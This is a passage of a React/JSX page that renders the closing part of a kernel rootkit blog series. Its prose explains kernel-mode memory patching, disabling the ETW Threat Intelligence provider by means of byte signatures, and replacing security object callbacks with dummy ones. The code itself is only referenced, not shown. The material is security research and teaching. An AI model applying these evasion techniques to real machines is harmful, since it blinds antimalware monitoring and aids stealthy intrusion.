                            The function <InlineCode text="GetModuleBase"/> is getting the PEB of the process and
                            searching its <InlineCode text="InLoadOrderModuleList"/> for the base address of the given
                            module name, in this case - the module that the user provided for patching.
                        </div>

                        <Code text={patcherCodeP4}/>
                        Next, the <InlineCode text="GetFunctionAddress"/> is called to iterate the export table of that
                        module and search for a specific function within it.

                        <Code text={patcherCodeP5}/>
                        Once the function address achieved, it now can be patched using the <InlineCode
                        text="KeWriteProcessMemory"/> function to overwrite it with the given patch.

                        <Code text={keWriteProcessMemory}/>
                        <InlineCode text="KeWriteProcessMemory"/> is doing several things, first a check is performed on
                        the given source and destination addresses to validate that they are valid addresses. Then, a
                        handle to the process is acquired through <InlineCode text="ObOpenObjectByPointer"/> using the
                        <InlineCode text=" EPROCESS"/> given as a parameter, later on the protection is changed to
                        <InlineCode text=" PAGE_READWRITE"/> to ensure there are write permissions and finally the data
                        is copied using <InlineCode text="MmCopyVirtualMemory"/> to copy the data.

                        <div className="pt-2">
                            To finish, need to implement a function that can receive user input:
                        </div>

                        <Code text={patcherCodeP6}/>
                        And for the user mode side:

                        <Code text={patcherUm}/>
                    </div>

                    <SecondaryHeader text="Interacting With Kernel Memory"/>
                    <div className="pt-4">
                        Interacting with kernel mode memory is different from interacting with user mode memory in some
                        ways, one of them being that there is no need for attaching to different processes to access
                        memory and the main limitation is Kernel Patch Protection (<InlineCode text="PatchGuard"/>).
                        There are several deep dive articles about <InlineCode text="PatchGuard"/> (and I also explained
                        a little about it in <StyledLink
                        href="https://www.youtube.com/watch?v=CVJmGfElqw0" content="my talk" textSize="text-md"/>) so I
                        won&apos;t go too deep into it. Generally speaking, <InlineCode text="PatchGuard"/> is
                        protecting certain critical objects (tables, lists, registers, etc) and scans the device once
                        each certain period of time (this time is randomly generated each boot), if it finds mismatch it
                        will crash the system with error code 0x109 (<InlineCode text="CRITICAL_STRUCTURE_CORRUPTION"/>)
                        . The full list of protected objects is available in <StyledLink
                        href="https://learn.microsoft.com/en-us/windows-hardware/drivers/debugger/bug-check-0x109---critical-structure-corruption"
                        content="MSDN" textSize="text-md"/>.

                        <div className="pt-2">
                            Other than that, modification to kernel objects will cause no issue (if done correctly) and
                            will not crash the system. An example of it can be enabling / disabling <InlineCode
                            text="ETW-TI"/>:
                        </div>

                        <Code text={enableDisableEtwti}/>
                        <InlineCode text="ETW-TI"/> is an <InlineCode text="ETW"/> provider that is created by Microsoft
                        to provide insights on specific operations that happens on the system via specific syscall
                        monitoring. The reason Microsoft created that provider is that back in the days both antimalware
                        and malwares abused the ability to filter syscalls (via <InlineCode text="SSDT hooking"/> and
                        other methods) for monitoring syscall execution. To give the ability to monitor important
                        syscalls with lower risk to the user, Microsoft created an <InlineCode text="ETW"/> provider
                        that an authorized antimalware vendor (the vendor need to get a proper signature from Microsoft
                        to register to that provider) can use.

                        <div className="pt-2">
                            To disable it, first the address of the <InlineCode text="ETW-TI"/> provider and its lock
                            are found via signature (more on that in the next section), then the lock is acquired to
                            ensure safe modification of the provider and lastly the value is changed via <InlineCode
                            text="MmCopyVirtualMemory"/> . As you can see, there was no need to attach to specific
                            process or change any page permission making it easier to modify target memory but also
                            making it more prone to mistakes by the developer.
                        </div>
                    </div>

                    <SecondaryHeader text="Signature Making Process"/>
                    <div className="pt-4">
                        In this section, I will use the previous example of <InlineCode text="ETW-TI"/> disabling to
                        show the process of finding and creating a signature via IDA Free (it doesn&apos;t matter which
                        SRE (software reverse engineering) is used, use whatever you feel more comfortable with :) ). To
                        create the best signature, it is preferable to check against several Windows versions but for
                        the sake of the explanation I will document the process for Windows 11 22H2.

                        <div className="pt-2">
                            The first thing that is needed to be done is to find the <InlineCode text="ETW-TI"/> handle
                            in first place. To do so, it is best to look at the function that initializing all
                            <InlineCode text=" ETW"/> providers - <InlineCode text="EtwpInitialize"/>. After a quick
                            looking the handler is found:
                        </div>

                        <Code text={etwtiExplanationP1}/>
                        So now that we know that <InlineCode text="EtwThreatIntProvRegHandle"/> is the target handle, we
                        can look at xrefs to it and see if there is any exported function that using it. From searching
                        in xrefs, the only function that is using it (in the searched version) and is exported is
                        <InlineCode text=" KeInsertQueueApc"/> . The reason behind searching an exported function is to
                        find the target objects with as little signatures as possible.

                        <Code text={etwtiExplanationP2}/>
                        Now, we can create a signature using the <InlineCode text="mov rcx,"/> operation (if the opcodes
                        of the target aren&apos;t the first occurrence, the signature will be created using couple of
                        instructions i.e. <InlineCode text="xor edx, edx; mov rcx, cs:EtwThreatIntProvRegHandle"/>). To
                        see the bytes conveniently in IDA we can change the amount of bytes seen next to the instruction
                        by navigating to Options → General and change the Number of opcode bytes (graph) from 0 to 8.

                        <Code text={etwtiExplanationP3}/>
                        Since now we see hat <InlineCode text="48 8B"/> is repeating itself above, we can use the
                        <InlineCode text="D2"/> above to create the signature: <InlineCode text="D2 48 8B"/> and know
                        that the offset to the handle will be in <InlineCode text="baseAddress + foundIndex + offset"/>
                        (usually this is the calculation but it might shift a little depends on the instructions) where
                        the <InlineCode text="offset"/> will be 3 in this case, the <InlineCode text="foundIndex"/> is
                        the index that this signature was found in the function and <InlineCode text="baseAddress"/> is
                        the address of the function (in this case, <InlineCode text="KeInsertQueueApc"/>).

                        <div className="pt-2">
                            Now, all that is left to do is to repeat the process for the lock as well and assign a
                            proper variable with the right type.
                        </div>
                    </div>

                    <SecondaryHeader text="Patching Kernel Callbacks"/>
                    <div className="pt-4">
                        Another example for modifying kernel mode memory can be patching kernel callbacks. The kernel
                        callbacks are stored inside different linked lists, one for each callback type. To find the
                        list, usually we will need to go through a process of creating a signature and binary searching
                        the object (<b>NOTE: It is super important to notice that when searching need to make sure the
                        searched address is valid and not searching within <StyledLink
                            href="https://devblogs.microsoft.com/oldnewthing/20120712-00/?p=7143"
                            content="discardable page" textSize="text-md"/> or it might cause a BSOD</b>).
                        However, I want to show the different case of object callbacks (if you want, you can refresh
                        your memory on object callbacks <StyledLink
                        href="https://idov31.github.io/posts/lord-of-the-ring0-p4"
                        content="here" textSize="text-md"/>).

                        <Code text={listCallbacks}/>
                        In this function, there is no binary searching or any signature, instead the
                        exported <InlineCode
                        text="Ps*Type"/> is used to enumerate the callbacks. The reason being, that for object callbacks
                        there is no internal list that is being used, instead the callbacks are saved inside a list in
                        the corresponding object type itself in a structure called <InlineCode text="CallbackList"/>.
                        Conveniently, the <InlineCode text="TypeLock"/> is available to acquire from the list as well.

                        <div className="pt-2">
                            From there, it is a matter of acquiring the lock, iterating the list and find the wanted
                            callback by checking if it matches the user provided callback (this current function also
                            lists the callbacks, and finding the corresponding driver name by searching where the
                            callback is located using the address range of each driver) and if it matches it will
                            replace the callback with a dummy callback (or restore the original one, depends on the user
                            input) that does not do anything.
                        </div>
                    </div>

                    <SecondaryHeader text="The End?"/>
                    <div className="pt-4">
                        I have thought for a long time when and how to end this series. From a small “hello world”
                        driver to one of the drivers with most features and support in all Windows versions since the
                        first release of Windows 10 - this was definitely quite a journey and of course, I cannot forget
                        about this blog series as well.

                        <div className="pt-2">
                            I can’t thank enough for all the people that helped to proofread the posts, gave advices and
                            points for improvement and the hours upon hours of debugging, reversing and coding for this
                            series and Nidhogg - it was a hell of a ride.
                        </div>

                        <div className="pt-2">
                            While I’m writing this in past tense, this is far from being the reality. As in the last
                            couple of months I worked (and working) on amazing projects that some will be released in
                            the following months and some might take a little longer than that (and also, there will be
                            some minor improvements, fixes and features for Nidhogg as well!).
                        </div>

                        <div className="pt-2">
                            I’m glad to see that several people has been motivated (some told me that by directly
                            reaching
                            out - which I encourage you to do!) from Nidhogg and Lord Of The Ring0 to create their own
                            rootkit and get into this marvelous world of windows kernel development.
                        </div>

                        <div className="pt-2">
                            To answer this section’s question - while this is the end of Lord Of The Ring0 and there
                            won’t be any major updates to Nidhogg in the foreseen future this is definitely not the end
                            of the kernel development journey but merely the start of it so expect new blog posts, new
                            projects and some novel research because now it is when it really going to begin. It is
                            finally time to level up.
                        </div>
                    </div>
                </article>
            </div>
        </div>
    );
}